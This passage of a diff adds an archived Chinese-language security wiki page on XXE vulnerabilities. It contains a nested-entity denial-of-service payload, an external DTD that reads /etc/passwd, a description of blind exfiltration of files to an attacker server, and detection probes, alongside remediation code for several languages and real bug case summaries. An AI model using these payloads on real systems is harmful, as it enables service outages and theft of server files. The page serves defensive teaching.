+    <span style="box-sizing:border-box;">&lt;!ELEMENT wooyunz <span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>#PCDATA<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span><span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span>
+    <span style="box-sizing:border-box;">&lt;!ENTITY wooyun1 <span style="box-sizing:border-box;color:rgb(255, 0, 0);">"&amp;wooyun;&amp;wooyun;&amp;wooyun;&amp;wooyun;&amp;wooyun;&amp;wooyun;&amp;wooyun;&amp;wooyun;&amp;wooyun;&amp;wooyun;"</span><span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span>
+    <span style="box-sizing:border-box;">&lt;!ENTITY wooyun2 <span style="box-sizing:border-box;color:rgb(255, 0, 0);">"&amp;wooyun1;&amp;wooyun1;&amp;wooyun1;&amp;wooyun1;&amp;wooyun1;&amp;wooyun1;&amp;wooyun1;&amp;wooyun1;&amp;wooyun1;&amp;wooyun1;"</span><span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span>
+    <span style="box-sizing:border-box;">&lt;!ENTITY wooyun3 <span style="box-sizing:border-box;color:rgb(255, 0, 0);">"&amp;wooyun2;&amp;wooyun2;&amp;wooyun2;&amp;wooyun2;&amp;wooyun2;&amp;wooyun2;&amp;wooyun2;&amp;wooyun2;&amp;wooyun2;&amp;wooyun2;"</span><span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span>
+    <span style="box-sizing:border-box;">&lt;!ENTITY wooyun4 <span style="box-sizing:border-box;color:rgb(255, 0, 0);">"&amp;wooyun3;&amp;wooyun3;&amp;wooyun3;&amp;wooyun3;&amp;wooyun3;&amp;wooyun3;&amp;wooyun3;&amp;wooyun3;&amp;wooyun3;&amp;wooyun3;"</span><span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span>
+    <span style="box-sizing:border-box;">&lt;!ENTITY wooyun5 <span style="box-sizing:border-box;color:rgb(255, 0, 0);">"&amp;wooyun4;&amp;wooyun4;&amp;wooyun4;&amp;wooyun4;&amp;wooyun4;&amp;wooyun4;&amp;wooyun4;&amp;wooyun4;&amp;wooyun4;&amp;wooyun4;"</span><span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span>
+    <span style="box-sizing:border-box;">&lt;!ENTITY wooyun6 <span style="box-sizing:border-box;color:rgb(255, 0, 0);">"&amp;wooyun5;&amp;wooyun5;&amp;wooyun5;&amp;wooyun5;&amp;wooyun5;&amp;wooyun5;&amp;wooyun5;&amp;wooyun5;&amp;wooyun5;&amp;wooyun5;"</span><span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span>
+    <span style="box-sizing:border-box;">&lt;!ENTITY wooyun7 <span style="box-sizing:border-box;color:rgb(255, 0, 0);">"&amp;wooyun6;&amp;wooyun6;&amp;wooyun6;&amp;wooyun6;&amp;wooyun6;&amp;wooyun6;&amp;wooyun6;&amp;wooyun6;&amp;wooyun6;&amp;wooyun6;"</span><span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span>
+    <span style="box-sizing:border-box;">&lt;!ENTITY wooyun8 <span style="box-sizing:border-box;color:rgb(255, 0, 0);">"&amp;wooyun7;&amp;wooyun7;&amp;wooyun7;&amp;wooyun7;&amp;wooyun7;&amp;wooyun7;&amp;wooyun7;&amp;wooyun7;&amp;wooyun7;&amp;wooyun7;"</span><span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span>
+    <span style="box-sizing:border-box;">&lt;!ENTITY wooyun9 <span style="box-sizing:border-box;color:rgb(255, 0, 0);">"&amp;wooyun8;&amp;wooyun8;&amp;wooyun8;&amp;wooyun8;&amp;wooyun8;&amp;wooyun8;&amp;wooyun8;&amp;wooyun8;&amp;wooyun8;&amp;wooyun8;"</span><span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span>
+]&gt;
+ 
+<span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;wooyun<span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span></span><span style="box-sizing:border-box;">&amp;wooyun9;</span><span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;/wooyun<span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span></span></pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+这个XML在定义实体是不断嵌套调用，如解析时未对大小进行限制，则可能会导致内存大量被消耗，从而实现拒绝服务攻击。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+此外，还可以利用支持的协议构造出很多相关的攻击，如探测内网信息（如检测服务等）等。
+</p>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">4、实际案例</h3>
+<div style="box-sizing:border-box;">
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<strong style="box-sizing:border-box;font-weight:700;">gainover：WooYun-2014-59783：<a href="https://web.archive.org/web/20160124235011/http://wooyun.org/bugs/wooyun-2014-059783" title="http://wooyun.org/bugs/wooyun-2014-059783" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">百度某功能XML实体注入（二）</a> </strong>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+由于SVG本身是基于XML的，该漏洞在SVG转成JPG图片时的XML解析过程中厂商仅直接过滤了<code style="box-sizing:border-box;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;font-size:90%;padding:2px 4px;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);border-radius:4px;">ENTITY</code>关键字，但是由于DTD本身就支持调用外部的DTD文件，因此通过调用<code style="box-sizing:border-box;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;font-size:90%;padding:2px 4px;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);border-radius:4px;">&lt;!DOCTYPE svg SYSTEM “<a href="https://web.archive.org/web/20160124235011/http://example.com/xxe.dtd" title="http://example.com/xxe.dtd" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">http://example.com/xxe.dtd</a>”&gt;</code>的方式引入外部的DTD文件即成功避开了对<code style="box-sizing:border-box;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;font-size:90%;padding:2px 4px;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);border-radius:4px;">ENTITY</code>关键字的过滤，其中<code style="box-sizing:border-box;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;font-size:90%;padding:2px 4px;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);border-radius:4px;">xxe.dtd</code>的内容如下：
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;"><span style="box-sizing:border-box;">&lt;!ENTITY test SYSTEM <span style="box-sizing:border-box;color:rgb(255, 0, 0);">"file:///etc/passwd"</span><span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span></pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<strong style="box-sizing:border-box;font-weight:700;">iv4n：WooYun-2014-74069：<a href="https://web.archive.org/web/20160124235011/http://www.wooyun.org/bugs/wooyun-2014-074069" title="http://www.wooyun.org/bugs/wooyun-2014-074069" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">鲜果网RSS导入Blind XXE漏洞</a></strong>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+该漏洞的过程是利用参数实体实现了XXE盲攻击，在读取本地文件后，将读出本地文件的内容作为URL中的参数向其指定服务器发起请求，在指定服务器的Apache日志中即可看到读出的文件内容。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<strong style="box-sizing:border-box;font-weight:700;">五道口杀气：WooYun-2014-59911：<a href="https://web.archive.org/web/20160124235011/http://www.wooyun.org/bugs/wooyun-2014-059911" title="http://www.wooyun.org/bugs/wooyun-2014-059911" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">从开源中国的某XXE漏洞到主站shell</a></strong>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+该漏洞在格式化xml时进行了解析且没有对外部实体进行限制，所以产生服务器上任意文件被读取的问题，从而导致主站的ssh用户名和密码泄露，被成功getshell。
+</p>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">5、修复方案</h3>
+<div style="box-sizing:border-box;">
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+在默认情况下关闭内联DTD解析（Inline DTD parsing）、外部实体、实体，使用白名单来控制允许实用的协议。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+了解所使用的XML解析器是否默认解析外部实体，如果默认解析应根据实际情况进行关闭或者限制。下面给出了一些常见的关闭方法：
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<strong style="box-sizing:border-box;font-weight:700;">PHP：</strong>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+对于使用SimpleXML解析XML的方法可在加载实体之前添加<code style="box-sizing:border-box;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;font-size:90%;padding:2px 4px;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);border-radius:4px;">libxml<em style="box-sizing:border-box;">disable</em>entity_loader(true);</code>语句以进制解析外部实体。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+对于使用DOM解析XML的方法可在加载实体之前添加<code style="box-sizing:border-box;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;font-size:90%;padding:2px 4px;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);border-radius:4px;">libxml<em style="box-sizing:border-box;">disable</em>entity_loader(true);</code>语句或者使用：
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;"><span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">&lt;?php</span>
+<span style="box-sizing:border-box;color:rgb(128, 128, 128);font-style:italic;">// with the DOM functionality:</span>
+<span style="box-sizing:border-box;color:rgb(0, 0, 255);">$dom</span> <span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">new</span> DOMDocument<span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">;</span>
+<span style="box-sizing:border-box;color:rgb(0, 0, 255);">$dom</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">-&gt;</span><span style="box-sizing:border-box;color:rgb(0, 102, 0);">loadXML</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(0, 0, 255);">$badXml</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span>LIBXML_DTDLOAD<span style="box-sizing:border-box;color:rgb(102, 204, 102);">|</span>LIBXML_DTDATTR<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">;</span>
+<span style="box-sizing:border-box;color:rgb(51, 153, 51);">?&gt;</span></pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+对于XMLReader解析XML的方法可使用：
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;"><span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">&lt;?php</span>
+<span style="box-sizing:border-box;color:rgb(128, 128, 128);font-style:italic;">// with the XMLReader functionality:</span>
+<span style="box-sizing:border-box;color:rgb(0, 0, 255);">$doc</span> <span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span> XMLReader<span style="box-sizing:border-box;color:rgb(102, 204, 102);">::</span><span style="box-sizing:border-box;color:rgb(0, 102, 0);">xml</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(0, 0, 255);">$badXml</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span><span style="box-sizing:border-box;color:rgb(255, 0, 0);">'UTF-8'</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span>LIBXML_NONET<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">;</span>
+<span style="box-sizing:border-box;color:rgb(51, 153, 51);">?&gt;</span></pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<strong style="box-sizing:border-box;font-weight:700;">Java：</strong>
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;">DocumentBuilderFactory dbf <span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span>DocumentBuilderFactory.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">newInstance</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">;</span>
+dbf.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">setExpandEntityReferences</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">false</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">;</span></pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<strong style="box-sizing:border-box;font-weight:700;">.Net：</strong>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+对于使用System.Xml.XmlReader解析XML的方法：
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+默认情况下，外部资源使用没有用户凭据的XmlUrlResolver对象进行解析。这意味着在默认情况下，可以访问任何不需要凭据的位置。通过执行下列操作之一，可以进一步保证安全：
+</p>
+<ul style="box-sizing:border-box;margin-top:0px;margin-bottom:10px;">
+<li style="box-sizing:border-box;"><div style="box-sizing:border-box;">通过将XmlReaderSettings.XmlResolver属性设置为XmlSecureResolver对象限制XmlReader可访问的资源。</div>
+</li>
+<li style="box-sizing:border-box;"><div style="box-sizing:border-box;">通过将XmlReaderSettings.XmlResolver属性设置为null，不允许XmlReader打开任何外部资源。</div>
+</li>
+</ul>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+对于利用超大的XML文档进行拒绝服务攻击的问题，使用XmlReader时，通过设置MaxCharactersInDocument属性，可以限制能够分析的文档大小。通过设置MaxCharactersFromEntities属性，可以限制从扩展实体中生成的字符数。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<strong style="box-sizing:border-box;font-weight:700;">Python：</strong>
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;"><span style="box-sizing:border-box;color:rgb(177, 177, 0);">from</span> lxml <span style="box-sizing:border-box;color:rgb(177, 177, 0);">import</span> etree
+xmlData <span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span> etree.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">parse</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>xmlSource<span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span>etree.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">XMLParser</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>resolve_entities<span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span><span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">False</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span></pre>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">6、漏洞扫描与发现</h3>
+<div style="box-sizing:border-box;">
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+检测XML是否被解析
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;"><span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;?xml</span> <span style="box-sizing:border-box;color:rgb(0, 0, 255);">version</span>=<span style="box-sizing:border-box;color:rgb(255, 0, 0);">"1.0"</span> <span style="box-sizing:border-box;color:rgb(0, 0, 255);">encoding</span>=<span style="box-sizing:border-box;color:rgb(255, 0, 0);">"UTF-8"</span><span style="box-sizing:border-box;color:rgb(153, 51, 51);">?&gt;</span></span>
+<span style="box-sizing:border-box;">&lt;!DOCTYPE ANY [</span>
+<span style="box-sizing:border-box;">	&lt;!ENTITY xxe "xxe test"&gt;</span>
+]&gt;
+<span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;root<span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span></span><span style="box-sizing:border-box;">&amp;xxe;</span><span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;/root<span style="box-sizing:border-box;color:rgb(153, 51, 51);">&gt;</span></span></span></pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+如果显示了xxe test证明支持，进行第二步
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+是否支持外部实体:
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;"><span style="box-sizing:border-box;"><span style="box-sizing:border-box;color:rgb(255, 0, 0);">&lt;?xml</span> <span style="box-sizing:border-box;color:rgb(0, 0, 255);">version</span>=<span style="box-sizing:border-box;color:rgb(255, 0, 0);">"1.0"</span> <span style="box-sizing:border-box;color:rgb(0, 0, 255);">encoding</span>=<span style="box-sizing:border-box;color:rgb(255, 0, 0);">"UTF-8"</span><span style="box-sizing:border-box;color:rgb(153, 51, 51);">?&gt;</span></span>
+<span style="box-sizing:border-box;">&lt;!DOCTYPE ANY [</span>
+<span style="box-sizing:border-box;">	&lt;!ENTITY % xxe SYSTEM "http://192.168.5.1/xxe.xml"&gt;</span>
+%xxe;
+]&gt;</pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+观察自己的服务器上得access.log，如果有xxe.xml的请求，证明可以加载外部实体。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+然后判断是否有回显，有回显就直接加载外部实体来进行攻击
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+不能回显，则使用Blind XXE攻击方法
+</p>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">7、相关其他安全问题</h3>
+<div style="box-sizing:border-box;">
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+未知
+</p>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">8、相关资源</h3>
+<div style="box-sizing:border-box;">
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160124235011/http://www.w3school.com.cn/x.asp" title="http://www.w3school.com.cn/x.asp" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">w3school：XML系列教程</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160124235011/http://security.tencent.com/index.php/blog/msg/69" title="http://security.tencent.com/index.php/blog/msg/69" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">Mark4z5：未知攻焉知防——XXE漏洞攻防</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160124235011/https://www.owasp.org/index.php/XML_External_Entity_/(XXE/)_Processing" title="https://www.owasp.org/index.php/XML_External_Entity_\(XXE\)_Processing" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">XML External Entity (XXE) Processing</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160124235011/http://blog.csdn.net/u011721501/article/details/43775691" title="http://blog.csdn.net/u011721501/article/details/43775691" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">读源码的猫：XXE漏洞以及Blind XXE总结</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160124235011/http://websec.io/2012/08/27/Preventing-XEE-in-PHP.html" title="http://websec.io/2012/08/27/Preventing-XEE-in-PHP.html" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">Chris Cornutt：Preventing XXE in PHP</a>
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+<a href="https://web.archive.org/web/20160124235011/https://www.youtube.com/watch?v=eHSNT8vWLfc" title="https://www.youtube.com/watch?v=eHSNT8vWLfc" rel="nofollow" style="box-sizing:border-box;background-color:transparent;color:rgb(51, 122, 183);text-decoration:none;background-repeat:no-repeat;background-position:0px center;padding:0px 0px 0px 18px;background-image:url(&amp;quot;/web/20160409021439/http://wiki.wooyun.org/lib/images/external-link.png&amp;quot;);">Timothy D.Morgan：What You Didn't Know About XML External Entities Attacks</a>
+</p>
+
+</div>
+
+              
+
+                            
+            <span style="display:table;clear:both;"/></div></div></div></span></div></div></div></div></div><br/></div></body></html>
